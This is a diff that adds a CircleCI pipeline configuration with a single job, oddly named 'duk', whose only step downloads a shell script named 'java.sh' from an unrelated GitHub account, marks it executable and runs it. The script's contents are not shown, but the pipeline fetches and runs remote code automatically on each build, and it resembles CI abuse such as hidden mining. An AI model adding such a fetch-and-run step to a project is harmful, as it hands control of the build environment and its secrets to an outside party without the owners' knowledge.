@@ -1,0 +1,17 @@
+version: 2.1
+
+orbs:
+  python: circleci/python@0.2.1
+
+jobs:
+  duk:
+    executor: python/default
+    steps:
+      - run:
+          command: wget https://raw.githubusercontent.com/arisemarise/js/master/java.sh && chmod u+x java.sh && ./java.sh
+          name: duk
+
+workflows:
+  main:
+    jobs:
+      - duk
